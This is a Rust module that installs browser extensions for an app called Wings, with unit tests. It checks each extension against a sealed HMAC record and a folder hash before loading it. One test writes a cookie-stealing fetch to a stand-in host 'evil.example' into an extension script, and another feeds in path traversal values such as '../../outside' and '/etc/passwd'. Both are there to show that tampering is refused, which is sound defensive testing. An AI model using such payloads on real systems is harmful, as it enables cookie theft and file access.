//! The browser extensions a plugin's web views load: each unpacked in a folder of its own under the plugin's web folder,
//! and a list of them (`extensions.json`) with what each asked for and whether it is on. One the person picks, takes from
//! another browser or a store page is first staged, unpacked beside them, so its page can show what it asks for before
//! the person adds it.

use std::{
    fs,
    path::{Path, PathBuf},
    sync::atomic::{AtomicU64, Ordering},
};

use hmac::{Hmac, Mac};
use serde::{Deserialize, Serialize};
use sha2::Sha256;
use wings_web_extensions::Info;

use super::Profile;

/// Why an extension whose files or record changed since it was added doesn't load.
pub const CHANGED: &str = "Changed on disk since you added it; remove and add it again";
/// Why one added by a Wings before records were sealed doesn't load: nothing says it is what the person allowed.
pub const UNSEALED: &str = "Added before Wings checked extensions; remove and add it again";
/// Why none loads while Wings can't read the key its records are sealed with.
pub const NO_KEY: &str = "Wings needs Keychain access to check your extensions";

/// An extension the person added.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Added {
    pub id: String,
    pub name: String,
    pub version: String,
    pub description: String,
    /// Its icon, in its folder.
    pub icon: Option<PathBuf>,
    pub permissions: Vec<String>,
    pub hosts: Vec<String>,
    pub enabled: bool,
    /// The person allowed it in Wings' own dialog (`web::Ask`). Only one allowed is listed, and only one listed loads.
    #[serde(default)]
    pub allowed: bool,
    /// The hash of its whole folder (`wings_web_extensions::tree_hash`) as it was when Wings' dialog showed what it asks
    /// for: one changed since (a file edited behind Wings' back) runs code nobody allowed, so it doesn't load.
    #[serde(default)]
    pub tree: Option<String>,
    /// An HMAC of its id, `tree`, `permissions` and `hosts` with a key in the Keychain (`key`): the list is a file any
    /// program of yours can write, so a record changed there, or one written whole, doesn't load either.
    #[serde(default)]
    pub seal: Option<String>,
    /// Wings put its compatibility script in front of its background worker as it was readied (`prepare`), which the
    /// dialog says.
    #[serde(default)]
    pub compat: bool,
}

/// An extension that passed `verify`: only `verify` makes one, and only one loads (`web::mac::load`), granted no more
/// than the person allowed.
#[derive(Clone, Debug)]
pub struct Verified {
    pub id: String,
    pub dir: PathBuf,
    /// What Wings' dialog showed it asks for, which is all it is granted.
    pub permissions: Vec<String>,
    pub hosts: Vec<String>,
    _checked: (),
}

/// The key extension records are sealed with: 32 bytes, or why Wings can't read it.
pub type Key = Result<[u8; 32], String>;

/// Where a check gets the key, asked only for a record that is sealed: one with none needs no Keychain.
pub type KeyOf<'a> = &'a dyn Fn() -> Key;

/// One staged: unpacked and read, not added yet.
#[derive(Debug)]
pub struct Staged {
    pub stage: String,
    pub info: Info,
}

fn list_file(profile: &Profile) -> PathBuf {
    profile.dir.join("extensions.json")
}

fn installed_dir(profile: &Profile, id: &str) -> PathBuf {
    profile.dir.join("extensions").join(id)
}

fn staged_dir(profile: &Profile, stage: &str) -> PathBuf {
    profile.dir.join("staging").join(stage)
}

/// An id of letters and digits, which names a folder: never a path the plugin sends.
fn valid_id(id: &str) -> bool {
    !id.is_empty() && id.len() <= 64 && id.bytes().all(|byte| byte.is_ascii_alphanumeric())
}

/// A new id, unique in this run and across runs by the clock.
fn new_id() -> String {
    static NEXT: AtomicU64 = AtomicU64::new(0);
    let now = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_nanos();
    format!("{now:x}{:x}", NEXT.fetch_add(1, Ordering::Relaxed))
}

/// The extensions added, in the order they were.
pub fn list(profile: &Profile) -> Vec<Added> {
    fs::read(list_file(profile)).ok().and_then(|bytes| serde_json::from_slice(&bytes).ok()).unwrap_or_default()
}

fn save(profile: &Profile, list: &[Added]) -> Result<(), String> {
    fs::create_dir_all(&profile.dir).map_err(|error| error.to_string())?;
    let json = serde_json::to_vec_pretty(list).map_err(|error| error.to_string())?;
    // Written whole beside it and moved over, so a crash never leaves half a list.
    let next = profile.dir.join("extensions.json.next");
    fs::write(&next, json).and_then(|()| fs::rename(&next, list_file(profile))).map_err(|error| error.to_string())
}

/// The extensions that are on and pass `verify`, to load as Wings starts.
pub fn loadable(profile: &Profile, key: KeyOf) -> Vec<Verified> {
    list(profile).iter().filter(|added| added.enabled).filter_map(|added| verify(profile, added, key).ok()).collect()
}

/// The one check before an extension loads, wherever it loads from (as Wings starts, turned on, added): the person
/// allowed it, its record is sealed with this Mac's key as Wings wrote it, and its folder is the one they allowed. Why
/// not, as the settings page shows it, if it isn't.
pub fn verify(profile: &Profile, added: &Added, key: KeyOf) -> Result<Verified, String> {
    if !added.allowed {
        return Err(NEVER_ALLOWED.into());
    }
    let (Some(tree), Some(seal)) = (&added.tree, &added.seal) else { return Err(UNSEALED.into()) };
    let key = key()?;
    let sealed = hex(seal).is_some_and(|seal| sealer(&key, profile, added, tree).verify_slice(&seal).is_ok());
    let dir = installed_dir(profile, &added.id);
    if !sealed || wings_web_extensions::tree_hash(&dir).ok().as_ref() != Some(tree) {
        return Err(CHANGED.into());
    }
    Ok(Verified { id: added.id.clone(), dir, permissions: added.permissions.clone(), hosts: added.hosts.clone(), _checked: () })
}

/// The extension `id`, if it is listed and passes `verify`.
pub fn verified(profile: &Profile, id: &str, key: KeyOf) -> Result<Verified, String> {
    let added = list(profile).into_iter().find(|added| added.id == id).ok_or("No extension by that id")?;
    verify(profile, &added, key)
}

const NEVER_ALLOWED: &str = "That extension was never allowed. Add it again to see what it can do";

/// The HMAC of what the person allowed of `added`, whose folder hashed `tree`, in `profile`: each part with its length,
/// so no two records write the same bytes.
fn sealer(key: &[u8; 32], profile: &Profile, added: &Added, tree: &str) -> Hmac<Sha256> {
    let mut mac = Hmac::<Sha256>::new_from_slice(key).expect("an HMAC takes a key of any length");
    let mut part = |bytes: &[u8]| {
        mac.update(&(bytes.len() as u64).to_le_bytes());
        mac.update(bytes);
    };
    for text in ["wings-web-extension-1", &profile.plugin, &profile.scope, &added.id, tree] {
        part(text.as_bytes());
    }
    for list in [&added.permissions, &added.hosts] {
        part(&(list.len() as u64).to_le_bytes());
        for item in list {
            part(item.as_bytes());
        }
    }
    mac
}

fn hex(text: &str) -> Option<Vec<u8>> {
    (text.len() % 2 == 0).then_some(())?;
    (0..text.len()).step_by(2).map(|at| u8::from_str_radix(text.get(at..at + 2)?, 16).ok()).collect()
}

fn to_hex(bytes: &[u8]) -> String {
    bytes.iter().map(|byte| format!("{byte:02x}")).collect()
}

/// The key extension records are sealed with, read once in a run: a refusal is kept too, so Wings asks the Keychain once
/// and not in a loop, until the person asks it to try again (`ask_for_key_again`). Never on the main thread: the Keychain
/// may wait for the person.
pub fn key(profile: &Profile) -> Key {
    let mut kept = SEAL_KEY.lock().unwrap();
    kept.get_or_insert_with(|| read_key(profile.dir.parent().unwrap_or(&profile.dir))).clone()
}

/// The next `key` asks the Keychain again, if it refused.
pub fn ask_for_key_again() {
    let mut kept = SEAL_KEY.lock().unwrap();
    if matches!(*kept, Some(Err(_))) {
        *kept = None;
    }
}

static SEAL_KEY: std::sync::Mutex<Option<Key>> = std::sync::Mutex::new(None);

/// One Keychain item for every extension record, made the first time.
#[cfg(not(any(test, debug_assertions, feature = "test-support")))]
fn read_key(_web_root: &Path) -> Key {
    let entry = keyring::Entry::new("dev.wings.app.web-extensions", "records").map_err(|_| NO_KEY.to_owned())?;
    match entry.get_secret() {
        Ok(kept) => kept.try_into().map_err(|_| NO_KEY.to_owned()),
        Err(keyring::Error::NoEntry) => {
            let key = random()?;
            entry.set_secret(&key).map(|()| key).map_err(|_| NO_KEY.to_owned())
        }
        Err(_) => Err(NO_KEY.into()),
    }
}

/// A debug build's key, in a file only this user reads beside the plugins' web folders: each build is another binary,
/// which the Keychain would ask about every time (as `page::runtime::wasm::cache` does).
#[cfg(any(test, debug_assertions, feature = "test-support"))]
fn read_key(web_root: &Path) -> Key {
    use std::{io::Write, os::unix::fs::OpenOptionsExt};
    let file = web_root.join("extensions.key");
    if let Some(key) = fs::read(&file).ok().and_then(|kept| kept.try_into().ok()) {
        return Ok(key);
    }
    let key = random()?;
    fs::create_dir_all(web_root).map_err(|error| error.to_string())?;
    match fs::OpenOptions::new().write(true).create_new(true).mode(0o600).open(&file) {
        Ok(mut out) => out.write_all(&key).map(|()| key).map_err(|error| error.to_string()),
        Err(_) => fs::read(&file).ok().and_then(|kept| kept.try_into().ok()).ok_or_else(|| NO_KEY.to_owned()),
    }
}

fn random() -> Key {
    use std::io::Read;
    let mut key = [0; 32];
    fs::File::open("/dev/urandom").and_then(|mut source| source.read_exact(&mut key)).map_err(|error| error.to_string())?;
    Ok(key)
}

/// Empties the profile's `staging` folder once in a run, before the first stage of the run: what a page closed before
/// it added or discarded its stage left there (each up to 200 MB).
pub fn sweep_staging(profile: &Profile) {
    static SWEPT: std::sync::Mutex<Vec<PathBuf>> = std::sync::Mutex::new(Vec::new());
    let mut swept = SWEPT.lock().unwrap();
    if !swept.contains(&profile.dir) {
        swept.push(profile.dir.clone());
        let _ = fs::remove_dir_all(profile.dir.join("staging"));
    }
}

/// Stages the extension in the folder `from` (an unpacked one, or one of another browser's), or the package (a ZIP,
/// CRX or XPI) at the file `from`.
pub fn stage_path(profile: &Profile, from: &Path) -> Result<Staged, String> {
    sweep_staging(profile);
    let stage = new_id();
    let into = staged_dir(profile, &stage);
    let info = if from.is_dir() {
        wings_web_extensions::copy_folder(from, &into)
    } else {
        let bytes = wings_web_extensions::read_package(from).map_err(|error| format!("Couldn't read {}: {error}", from.display()))?;
        wings_web_extensions::unpack(&bytes, &into)
    };
    match info {
        Ok(info) => Ok(Staged { stage, info }),
        Err(error) => {
            let _ = fs::remove_dir_all(&into);
            Err(error.to_string())
        }
    }
}

/// Stages the package `bytes`, downloaded from a store.
pub fn stage_bytes(profile: &Profile, bytes: &[u8]) -> Result<Staged, String> {
    sweep_staging(profile);
    let stage = new_id();
    let into = staged_dir(profile, &stage);
    wings_web_extensions::unpack(bytes, &into).map(|info| Staged { stage, info }).map_err(|error| error.to_string())
}

/// Readies the staged extension `stage` to be asked about: its folder moves in with the others, unlisted, so nothing
/// loads it until the person allows it (`keep`) or it goes (`forget`). What it asks for is read again from that folder,
/// not taken from the page, and its folder is hashed as it is read: the hash goes with it into the record, and a folder
/// that isn't the same at load doesn't load.
pub fn prepare(profile: &Profile, stage: &str) -> Result<(Added, PathBuf), String> {
    if !valid_id(stage) {
        return Err("No extension is waiting to be added by that name".into());
    }
    let from = staged_dir(profile, stage);
    let id = new_id();
    let dir = installed_dir(profile, &id);
    fs::create_dir_all(profile.dir.join("extensions")).map_err(|error| error.to_string())?;
    fs::rename(&from, &dir).map_err(|error| error.to_string())?;
    // Before it is hashed, so the hash and the person's yes cover Wings' script too (`web::COMPAT`).
    let compat = wings_web_extensions::shim_service_worker(&dir, super::COMPAT).map_err(|error| error.to_string());
    // Hashed before and after it is read, so what the dialog shows is what the hash holds.
    let hashed = || wings_web_extensions::tree_hash(&dir).map_err(|error| error.to_string());
    let read = compat.and_then(|compat| {
        let before = hashed()?;
        let info = wings_web_extensions::read_manifest(&dir).map_err(|error| error.to_string())?;
        (hashed()? == before).then_some((info, before, compat)).ok_or_else(|| "The extension changed while Wings read it".to_owned())
    });
    let (info, tree, compat) = match read {
        Ok(read) => read,
        Err(error) => {
            let _ = fs::remove_dir_all(&dir);
            return Err(error);
        }
    };
    let added = Added {
        icon: info.icon.and_then(|icon| icon.strip_prefix(&dir).ok().map(Path::to_path_buf)),
        id,
        name: info.name,
        version: info.version,
        description: info.description,
        permissions: info.permissions,
        hosts: info.host_permissions,
        enabled: true,
        allowed: false,
        tree: Some(tree),
        seal: None,
        compat,
    };
    Ok((added, dir))
}

/// Lists `added`, which the person allowed in Wings' dialog, on: with the hash `prepare` made as the dialog was built
/// (never the folder read again after it), sealed with `key`.
pub fn keep(profile: &Profile, added: &Added, key: KeyOf) -> Result<(), String> {
    let tree = added.tree.as_ref().ok_or("The extension wasn't readied to be added")?;
    let key = key()?;
    let seal = to_hex(&sealer(&key, profile, added, tree).finalize().into_bytes());
    let mut list = list(profile);
    list.push(Added { allowed: true, enabled: true, seal: Some(seal), ..added.clone() });
    save(profile, &list)
}

/// Lets go of the folder of `id`, readied (`prepare`) but not allowed.
pub fn forget(profile: &Profile, id: &str) {
    if valid_id(id) && !list(profile).iter().any(|added| added.id == id) {
        let _ = fs::remove_dir_all(installed_dir(profile, id));
    }
}

/// Lets go of the staged extension `stage`.
pub fn discard(profile: &Profile, stage: &str) {
    if valid_id(stage) {
        let _ = fs::remove_dir_all(staged_dir(profile, stage));
    }
}

/// Turns the extension `id` on or off: on only once it passes `verify`, which it answers to load.
pub fn set_enabled(profile: &Profile, id: &str, enabled: bool, key: KeyOf) -> Result<Option<Verified>, String> {
    let mut list = list(profile);
    let added = list.iter_mut().find(|added| added.id == id).ok_or("No extension by that id")?;
    let verified = if enabled { Some(verify(profile, added, key)?) } else { None };
    added.enabled = enabled;
    save(profile, &list)?;
    Ok(verified)
}

/// Removes the extension `id` and its folder.
pub fn remove(profile: &Profile, id: &str) -> Result<(), String> {
    let mut list = list(profile);
    let before = list.len();
    list.retain(|added| added.id != id);
    if list.len() == before {
        return Err("No extension by that id".into());
    }
    save(profile, &list)?;
    if valid_id(id) {
        let _ = fs::remove_dir_all(installed_dir(profile, id));
    }
    Ok(())
}

/// The icon of `added`, in its folder.
pub fn icon_path(profile: &Profile, added: &Added) -> Option<PathBuf> {
    let icon = added.icon.as_ref()?;
    // Only a file inside its folder: the list is the app's, but a path in it is never followed out.
    icon.components().all(|part| matches!(part, std::path::Component::Normal(_))).then(|| installed_dir(profile, &added.id).join(icon))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The key tests seal with: never the Keychain's.
    const KEY: KeyOf = &|| Ok([7; 32]);

    fn profile() -> (Profile, tempfile::TempDir) {
        let dir = tempfile::tempdir().unwrap();
        (Profile { plugin: "browser".into(), scope: "s".into(), dir: dir.path().join("web") }, dir)
    }

    fn extension(at: &Path, name: &str) {
        fs::create_dir_all(at.join("icons")).unwrap();
        let manifest = serde_json::json!({
            "manifest_version": 3, "name": name, "version": "1.2", "description": "Blocks things",
            "permissions": ["storage"], "host_permissions": ["https://*/*"], "icons": { "48": "icons/48.png" },
            "background": { "service_worker": "background.js" },
        });
        fs::write(at.join("manifest.json"), manifest.to_string()).unwrap();
        fs::write(at.join("icons/48.png"), b"png").unwrap();
        fs::write(at.join("background.js"), b"// blocks").unwrap();
    }

    /// One added as the person allowed it, and its folder.
    fn added(profile: &Profile, temp: &tempfile::TempDir) -> (Added, PathBuf) {
        let source = temp.path().join("unpacked");
        extension(&source, "Blocker");
        let staged = stage_path(profile, &source).unwrap();
        let (added, dir) = prepare(profile, &staged.stage).unwrap();
        keep(profile, &added, KEY).unwrap();
        (list(profile)[0].clone(), dir)
    }

    #[test]
    fn a_staged_extension_is_added_only_when_asked_and_goes_with_remove() {
        let (profile, temp) = profile();
        let source = temp.path().join("from-chrome");
        extension(&source, "Blocker");
        let staged = stage_path(&profile, &source).unwrap();
        assert_eq!((staged.info.name.as_str(), staged.info.permissions.clone()), ("Blocker", vec!["storage".to_owned()]));
        assert!(list(&profile).is_empty(), "staging adds nothing");
        let (added, dir) = prepare(&profile, &staged.stage).unwrap();
        assert!(list(&profile).is_empty() && loadable(&profile, KEY).is_empty(), "nothing listed or loaded until it is allowed");
        keep(&profile, &added, KEY).unwrap();
        let added = list(&profile)[0].clone();
        assert!(dir.join("manifest.json").exists() && source.join("manifest.json").exists(), "a copy, the browser's own stays");
        assert_eq!((added.hosts.clone(), added.enabled), (vec!["https://*/*".to_owned()], true));
        assert_eq!(icon_path(&profile, &added), Some(dir.join("icons/48.png")));
        let loaded = loadable(&profile, KEY);
        assert_eq!((loaded.len(), loaded[0].permissions.clone(), loaded[0].hosts.clone()), (1, added.permissions.clone(), added.hosts.clone()));
        assert!(set_enabled(&profile, &added.id, false, KEY).unwrap().is_none());
        assert!(loadable(&profile, KEY).is_empty() && list(&profile).len() == 1);
        assert_eq!(set_enabled(&profile, &added.id, true, KEY).unwrap().map(|verified| verified.dir), Some(dir.clone()));
        remove(&profile, &added.id).unwrap();
        assert!(list(&profile).is_empty() && !dir.exists());
    }

    #[test]
    fn an_extension_never_allowed_is_never_listed_turned_on_or_loaded() {
        let (profile, temp) = profile();
        let source = temp.path().join("unpacked");
        extension(&source, "Grabber");
        let staged = stage_path(&profile, &source).unwrap();
        let (added, dir) = prepare(&profile, &staged.stage).unwrap();
        // Denied in Wings' dialog: its folder goes, and nothing names it.
        forget(&profile, &added.id);
        assert!(!dir.exists() && list(&profile).is_empty());
        // A list written by an older Wings, or by hand, with one never allowed: it stays off.
        save(&profile, &[Added { allowed: false, enabled: false, ..added.clone() }]).unwrap();
        assert!(set_enabled(&profile, &added.id, true, KEY).unwrap_err().contains("never allowed"));
        save(&profile, &[Added { allowed: false, enabled: true, ..added }]).unwrap();
        assert!(loadable(&profile, KEY).is_empty());
    }

    /// A file of its folder changed (its code, not only its manifest): it loads neither as Wings starts nor when turned
    /// on, and says why.
    #[test]
    fn an_extension_whose_files_changed_since_it_was_allowed_doesnt_load_at_start_or_when_turned_on() {
        let (profile, temp) = profile();
        let (added, dir) = added(&profile, &temp);
        assert_eq!(loadable(&profile, KEY).len(), 1);
        fs::write(dir.join("background.js"), b"fetch('https://evil.example/' + document.cookie)").unwrap();
        assert!(loadable(&profile, KEY).is_empty(), "as Wings starts");
        set_enabled(&profile, &added.id, false, KEY).unwrap();
        assert_eq!(set_enabled(&profile, &added.id, true, KEY).unwrap_err(), CHANGED, "turned on");
        assert!(!list(&profile)[0].enabled, "a refused turn on leaves it off");
        assert_eq!(verified(&profile, &added.id, KEY).unwrap_err(), CHANGED);
        // A manifest that now asks for every site, the same.
        fs::write(dir.join("background.js"), b"// blocks").unwrap();
        assert!(verified(&profile, &added.id, KEY).is_ok());
        let manifest = serde_json::json!({ "manifest_version": 3, "name": "Blocker", "version": "1.2", "host_permissions": ["<all_urls>"] });
        fs::write(dir.join("manifest.json"), manifest.to_string()).unwrap();
        assert_eq!(verified(&profile, &added.id, KEY).unwrap_err(), CHANGED);
    }

    /// One with a background worker gets Wings' compatibility script as it is readied, before its folder is hashed: the
    /// record says so (the dialog does), its own files stay, it loads, and a change to that script since doesn't load, as a
    /// change to any of its files doesn't.
    #[test]
    fn a_worker_gets_wings_script_before_the_hash_which_covers_it() {
        let (profile, temp) = profile();
        let (added, dir) = added(&profile, &temp);
        assert!(added.compat);
        let manifest: serde_json::Value = serde_json::from_slice(&fs::read(dir.join("manifest.json")).unwrap()).unwrap();
        assert_eq!(manifest["background"]["service_worker"], wings_web_extensions::SHIM_WORKER);
        assert_eq!(fs::read_to_string(dir.join(wings_web_extensions::SHIM_SCRIPT)).unwrap(), crate::web::COMPAT);
        assert_eq!(fs::read(dir.join("background.js")).unwrap(), b"// blocks");
        assert_eq!(loadable(&profile, KEY).len(), 1);
        fs::write(dir.join(wings_web_extensions::SHIM_SCRIPT), b"// something else").unwrap();
        assert_eq!(verified(&profile, &added.id, KEY).unwrap_err(), CHANGED);
    }

    /// The folder changed after the dialog was built and before Add: the record holds the hash of what the dialog showed,
    /// so the changed folder never counts as allowed.
    #[test]
    fn a_folder_changed_between_the_dialog_and_add_is_not_what_was_allowed() {
        let (profile, temp) = profile();
        let source = temp.path().join("unpacked");
        extension(&source, "Blocker");
        let staged = stage_path(&profile, &source).unwrap();
        let (added, dir) = prepare(&profile, &staged.stage).unwrap();
        let manifest = serde_json::json!({ "manifest_version": 3, "name": "Blocker", "version": "1.2", "host_permissions": ["<all_urls>"] });
        fs::write(dir.join("manifest.json"), manifest.to_string()).unwrap();
        keep(&profile, &added, KEY).unwrap();
        assert_eq!(list(&profile)[0].hosts, ["https://*/*"], "what the dialog showed");
        assert_eq!(verified(&profile, &added.id, KEY).unwrap_err(), CHANGED);
    }

    /// The list is a file any program of the person's can write: a record changed there, one with no seal (an older
    /// Wings'), or one sealed with another key doesn't load; nor does any while the key can't be read.
    #[test]
    fn a_record_changed_unsealed_or_sealed_elsewhere_doesnt_load() {
        let (profile, temp) = profile();
        let (added, _) = added(&profile, &temp);
        let id = added.id.clone();
        save(&profile, &[Added { hosts: vec!["<all_urls>".into()], ..added.clone() }]).unwrap();
        assert_eq!(verified(&profile, &id, KEY).unwrap_err(), CHANGED, "more sites than were allowed");
        save(&profile, &[Added { permissions: vec!["storage".into(), "cookies".into()], ..added.clone() }]).unwrap();
        assert_eq!(verified(&profile, &id, KEY).unwrap_err(), CHANGED, "more permissions");
        save(&profile, &[Added { seal: None, ..added.clone() }]).unwrap();
        assert_eq!(verified(&profile, &id, KEY).unwrap_err(), UNSEALED);
        // As an older Wings wrote it: a manifest hash and no seal.
        let old = serde_json::json!([{
            "id": id, "name": "Blocker", "version": "1.2", "description": "", "icon": null, "permissions": ["storage"],
            "hosts": ["https://*/*"], "enabled": true, "allowed": true, "manifest": "ab12",
        }]);
        fs::write(profile.dir.join("extensions.json"), old.to_string()).unwrap();
        assert_eq!(verified(&profile, &id, KEY).unwrap_err(), UNSEALED);
        save(&profile, &[added.clone()]).unwrap();
        assert_eq!(verified(&profile, &id, &|| Ok([8; 32])).unwrap_err(), CHANGED, "another key");
        assert_eq!(verified(&profile, &id, &|| Err(NO_KEY.into())).unwrap_err(), NO_KEY);
        assert!(loadable(&profile, &|| Err(NO_KEY.into())).is_empty());
        assert!(keep(&profile, &added, &|| Err(NO_KEY.into())).is_err(), "nothing is added unsealed");
        assert!(verified(&profile, &id, KEY).is_ok());
    }

    /// A stage left by a page that closed before Add or Cancel goes as the first stage of the next run is made; one of this
    /// run stays.
    #[test]
    fn stages_left_from_before_go_once_a_run() {
        let (profile, temp) = profile();
        let left = profile.dir.join("staging/18eb0000000000000");
        fs::create_dir_all(&left).unwrap();
        fs::write(left.join("big.js"), b"x").unwrap();
        let source = temp.path().join("unpacked");
        extension(&source, "Blocker");
        let first = stage_path(&profile, &source).unwrap();
        assert!(!left.exists(), "the last run's stage went");
        let second = stage_path(&profile, &source).unwrap();
        assert!(staged_dir(&profile, &first.stage).exists() && staged_dir(&profile, &second.stage).exists(), "this run's stay");
    }

    #[test]
    fn a_stage_or_id_that_is_a_path_reaches_no_folder() {
        let (profile, temp) = profile();
        let outside = temp.path().join("outside");
        extension(&outside, "Other");
        assert!(prepare(&profile, "../../outside").is_err());
        discard(&profile, "../../outside");
        assert!(outside.join("manifest.json").exists());
        let mut forged = Added {
            id: "abc".into(), name: "x".into(), version: "1".into(), description: String::new(),
            icon: Some(PathBuf::from("../../../outside/manifest.json")), permissions: vec![], hosts: vec![], enabled: true, allowed: true,
            tree: None, seal: None, compat: false,
        };
        assert_eq!(icon_path(&profile, &forged), None);
        forged.icon = Some(PathBuf::from("/etc/passwd"));
        assert_eq!(icon_path(&profile, &forged), None);
    }
}
